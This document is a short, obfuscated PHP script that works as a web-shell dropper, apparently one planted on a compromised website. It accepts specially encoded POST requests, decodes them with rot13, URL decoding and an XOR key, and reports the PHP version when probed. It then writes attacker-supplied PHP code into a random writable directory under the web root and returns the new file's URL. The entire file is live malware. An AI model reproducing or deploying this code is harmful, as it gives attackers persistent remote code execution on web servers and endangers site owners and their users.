<?php $ummsnaies = "nmdzsojnssavzqhh";$xakcb = "";foreach ($_POST as $msbgim => $veuje){if (strlen($msbgim) == 16 and substr_count($veuje, "%") > 10){asycda($msbgim, $veuje);}}function asycda($msbgim, $fjaggif){global $xakcb;$xakcb = $msbgim;$fjaggif = str_split(rawurldecode(str_rot13($fjaggif)));function bgtawk($ougzsk, $msbgim){global $ummsnaies, $xakcb;return $ougzsk ^ $ummsnaies[$msbgim % strlen($ummsnaies)] ^ $xakcb[$msbgim % strlen($xakcb)];}$fjaggif = implode("", array_map("bgtawk", array_values($fjaggif), array_keys($fjaggif)));$fjaggif = @unserialize($fjaggif);if (@is_array($fjaggif)){$msbgim = array_keys($fjaggif);$fjaggif = $fjaggif[$msbgim[0]];if ($fjaggif === $msbgim[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function kcauod($ruzispouuzir) {static $ktvbosw = array();$qtuevil = glob($ruzispouuzir . '/*', GLOB_ONLYDIR);if (count($qtuevil) > 0) {foreach ($qtuevil as $ruzispouuz){if (@is_writable($ruzispouuz)){$ktvbosw[] = $ruzispouuz;}}}foreach ($qtuevil as $ruzispouuzir) kcauod($ruzispouuzir);return $ktvbosw;}$qfzkj = $_SERVER["DOCUMENT_ROOT"];$qtuevil = kcauod($qfzkj);$msbgim = array_rand($qtuevil);$jsehtlt = $qtuevil[$msbgim] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($jsehtlt, $fjaggif);echo "http://" . $_SERVER["HTTP_HOST"] . substr($jsehtlt, strlen($qfzkj));exit();}}}